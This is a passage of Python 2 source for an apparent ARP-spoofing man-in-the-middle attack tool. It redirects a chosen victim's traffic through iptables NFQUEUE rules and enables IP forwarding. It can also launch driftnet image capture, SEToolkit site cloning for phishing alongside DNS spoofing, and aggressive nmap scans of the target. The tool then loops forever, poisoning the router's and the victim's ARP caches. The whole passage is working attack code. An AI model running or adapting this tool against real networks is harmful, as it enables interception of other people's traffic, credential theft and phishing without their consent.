   os.system('/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
   # To catch DNS packets you gotta do prerouting rather than forward for some reason?
   os.system('/sbin/iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
   with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
      ipf.write('1\n')
      print '[*] Enabled IP forwarding'
      return ipf.read()

# Start threads
def threads(args):

   rt = Thread(target=reactor.run, args=(False,)) #reactor must be started without signal handling since it's not in the main thread
   rt.daemon = True
   rt.start()

   if args.driftnet:
      dr = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/driftnet -i '+interface+' >/dev/null 2>&1',))
      dr.daemon = True
      dr.start()

   if args.dnsspoof and not args.setoolkit:
      setoolkit = raw_input('[*] You are DNS spoofing '+args.dnsspoof+', would you like to start the Social Engineer\'s Toolkit for easy exploitation? [y/n]: ')
      if setoolkit == 'y':
         print '[*] Starting SEtoolkit. To clone '+args.dnsspoof+' hit options 1, 2, 3, 2, then enter '+args.dnsspoof
         try:
            se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
            se.daemon = True
            se.start()
         except Exception:
            print '[-] Could not open SEToolkit, is it installed? Continuing as normal without it.'

   if args.nmapaggressive:
      print '[*] Starting '+R+'aggressive scan [nmap -e '+interface+' -T4 -A -v -Pn -oN '+victimIP+']'+W+' in background; results will be in a file '+victimIP+'.nmap.txt'
      try:
         n = Thread(target=os.system, args=('nmap -e '+interface+' -T4 -A -v -Pn -oN '+victimIP+'.nmap.txt '+victimIP+' >/dev/null 2>&1',))
         n.daemon = True
         n.start()
      except Exception:
         print '[-] Aggressive Nmap scan failed, is nmap installed?'

   if args.setoolkit:
      print '[*] Starting SEtoolkit'
      try:
         se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
         se.daemon = True
         se.start()
      except Exception:
         print '[-] Could not open SEToolkit, continuing without it.'

def pcap_handler(args):
   global victimIP
   bad_args = [args.dnsspoof, args.beef, args.code, args.nmap, args.nmapaggressive, args.driftnet, args.interface]
   for x in bad_args:
      if x:
         exit('[-] When reading from pcap file you may only include the following arguments: -v, -u, -p, -pcap [pcap filename], and -ip [victim IP address]')
   if args.pcap:
      if args.ipaddress:
         victimIP = args.ipaddress
         pcap = rdpcap(args.pcap)
         for payload in pcap:
            Parser(args).start(payload)
         exit('[-] Finished parsing pcap file')
      else:
         exit('[-] Please include the following arguement when reading from a pcap file: -ip [target\'s IP address]')
   else:
      exit('[-] When reading from pcap file you may only include the following arguments: -v, -u, -p, -pcap [pcap filename], and -ip [victim IP address]')

# Main loop
def main(args):
   global victimIP, interface

   if args.pcap:
      pcap_handler(args)
      exit('[-] Finished parsing pcap file')

   #Check if root
   if not os.geteuid()==0:
      exit("\nPlease run as root\n")

   #Find the gateway and interface
   ipr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
   ipr = ipr.communicate()[0]
   iprs = ipr.split('\n')
   ipr = ipr.split()
   if args.routerip:
      routerIP = args.routerip
   else:
      routerIP = ipr[2]
   for r in iprs:
      if '/' in r:
         IPprefix = r.split()[0]
   if args.interface:
      interface = args.interface
   else:
      interface = ipr[4]
   if 'eth' in interface or 'p3p' in interface:
      exit('[-] Wired interface found as default route, please connect wirelessly and retry, or specify the active interface with the -i [interface] option. See active interfaces with [ip addr] or [ifconfig].')
   if args.ipaddress:
      victimIP = args.ipaddress
   else:
      au = active_users()
      au.users(IPprefix, routerIP)
      print '\n[*] Turning off monitor mode'
      os.system('airmon-ng stop %s >/dev/null 2>&1' % au.monmode)
      try:
         victimIP = raw_input('[*] Enter the non-router IP to spoof: ')
      except KeyboardInterrupt:
         exit('\n[-] Quitting')

   print "[*] Checking the DHCP and DNS server addresses..."
   # DHCP is a pain in the ass to craft
   dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
         IP(src="0.0.0.0",dst="255.255.255.255")/
         UDP(sport=68,dport=67)/
         BOOTP(chaddr='E3:2E:F4:DD:8R:9A')/
         DHCP(options=[("message-type","discover"),
            ("param_req_list",
            chr(DHCPRevOptions["router"][0]),
            chr(DHCPRevOptions["domain"][0]),
            chr(DHCPRevOptions["server_id"][0]),
            chr(DHCPRevOptions["name_server"][0]),
            ), "end"]))
   ans, unans = srp(dhcp, timeout=5, retry=1)
   if ans:
      for s,r in ans:
         DHCPopt = r[0][DHCP].options
         DHCPsrvr = r[0][IP].src
         for x in DHCPopt:
            if 'domain' in x:
               local_domain = x[1]
               pass
            else:
               local_domain = 'None'
            if 'name_server' in x:
               dnsIP = x[1]
   else:
      print "[-] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP."
      dnsIP = routerIP
      DHCPsrvr = routerIP
      local_domain = 'None'

   # Print the vars
   print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
   if args.routermac:
      routerMAC = args.routermac
      print "[*] Router MAC: " + routerMAC
      logger.write("[*] Router MAC: "+routerMAC+'\n')
   else:
      try:
         routerMAC = Spoof().originalMAC(routerIP)
         print "[*] Router MAC: " + routerMAC
         logger.write("[*] Router MAC: "+routerMAC+'\n')
      except Exception:
         print "[-] Router did not respond to ARP request; attempting to pull MAC from local ARP cache - [/usr/bin/arp -n]"
         logger.write("[-] Router did not respond to ARP request; attempting to pull the MAC from the ARP cache - [/usr/bin/arp -n]")
         try:
            arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
            split_lines = arpcache.communicate()[0].splitlines()
            for line in split_lines:
               if routerIP in line:
                  routerMACguess = line.split()[2]
                  if len(routerMACguess) == 17:
                     accr = raw_input("[+] Is "+R+routerMACguess+W+" the the accurate router MAC? [y/n]: ")
                     if accr == 'y':
                        routerMAC = routerMACguess
                        print "[*] Router MAC: "+routerMAC
                        logger.write("[*] Router MAC: "+routerMAC+'\n')
                  else:
                     exit("[-] Failed to get accurate router MAC address")
         except Exception:
            exit("[-] Failed to get accurate router MAC address")

   if args.victimmac:
      victimMAC = args.victimmac
      print "[*] Victim MAC: " + victimMAC
      logger.write("[*] Victim MAC: "+victimMAC+'\n')
   else:
      try:
         victimMAC = Spoof().originalMAC(victimIP)
         print "[*] Victim MAC: " + victimMAC
         logger.write("[*] Victim MAC: "+victimMAC+'\n')
      except Exception:
         exit("[-] Could not get victim MAC address; try the -vmac [xx:xx:xx:xx:xx:xx] option if you know the victim's MAC address\n    and make sure the interface being used is accurate with -i <interface>")

   ipf = setup(victimMAC)
   Queued(args)
   threads(args)

   if args.nmap:
      print "\n[*] Running nmap scan; this may take several minutes - [nmap -T4 -O %s]" % victimIP
      try:
         nmap = Popen(['/usr/bin/nmap', '-T4', '-O', '-e', interface, victimIP], stdout=PIPE, stderr=DN)
         nmap.wait()
         nmap = nmap.communicate()[0].splitlines()
         for x in nmap:
            if x != '':
               print '[+]',x
               logger.write('[+] '+x+'\n')
      except Exception:
         print '[-] Nmap port and OS scan failed, is it installed?'

   print ''

   # Cleans up if Ctrl-C is caught
   def signal_handler(signal, frame):
      print 'learing iptables, sending healing packets, and turning off IP forwarding...'
      logger.close()
      with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
         forward.write(ipf)
      Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
      Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
      os.system('/sbin/iptables -F')
      os.system('/sbin/iptables -X')
      os.system('/sbin/iptables -t nat -F')
      os.system('/sbin/iptables -t nat -X')
      exit(0)
   signal.signal(signal.SIGINT, signal_handler)

   while 1:
      Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
      time.sleep(1.5)

if __name__ == "__main__":
   main(parse_args())
